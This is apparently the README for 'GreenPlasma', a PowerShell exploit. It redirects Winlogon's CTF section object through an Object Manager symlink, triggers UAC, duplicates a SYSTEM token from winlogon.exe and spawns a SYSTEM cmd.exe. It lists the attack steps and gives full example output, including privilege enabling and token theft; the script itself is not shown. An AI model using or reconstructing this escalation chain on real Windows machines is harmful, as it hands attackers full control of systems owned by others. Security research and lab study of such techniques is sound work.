PowerShell implementation of the GreenPlasma section-object workflow.

This script:

1. Creates an Object Manager symbolic link for the current user session.
2. Redirects the Winlogon CTF section path to a chosen target Section object path.
3. Automatically opens a UAC prompt through Explorer.
4. Waits for Winlogon to create the redirected Section object.
5. Attempts to duplicate a SYSTEM token.
6. Spawns a SYSTEM `cmd.exe`.

## Requirements

Run from an elevated **64-bit PowerShell** window.

====================== Example Output ======================
[+] Session: 2
[+] Source:  \Sessions\2\BaseNamedObjects\CTF.AsmListCache.FMPWinlogon2
[+] Target:  \Sessions\2\BaseNamedObjects\CTFMON_DEAD
[*] Killing ctfmon.exe PID 16416 in session 2
[+] Symlink armed on attempt 1
[+] Object Manager symlink armed
[+] \Sessions\2\BaseNamedObjects\CTF.AsmListCache.FMPWinlogon2 -> \Sessions\2\BaseNamedObjects\CTFMON_DEAD
[+] Waiting for SYSTEM-created section
[+] UAC will be triggered automatically. Approve the prompt.
[*] Triggering UAC from medium-integrity Explorer...
[*] NtOpenSection: 0xC0000034

[+] Section handle: 0x754
[*] Attempting SYSTEM token duplication...
[*] EnablePrivilege(SeDebugPrivilege) ok=True err=0
[*] EnablePrivilege(SeImpersonatePrivilege) ok=True err=0
[*] EnablePrivilege(SeAssignPrimaryTokenPrivilege) ok=True err=1300
[*] EnablePrivilege(SeIncreaseQuotaPrivilege) ok=True err=0
[*] Trying preferred SYSTEM processes first...
[+] Duplicated SYSTEM token from PID 8236 (winlogon.exe) access=0xF01FF
[+] SYSTEM process spawned, PID 24032

[+] Holding link and section handles open.
[+] Press Enter only after you have the SYSTEM shell / flag.
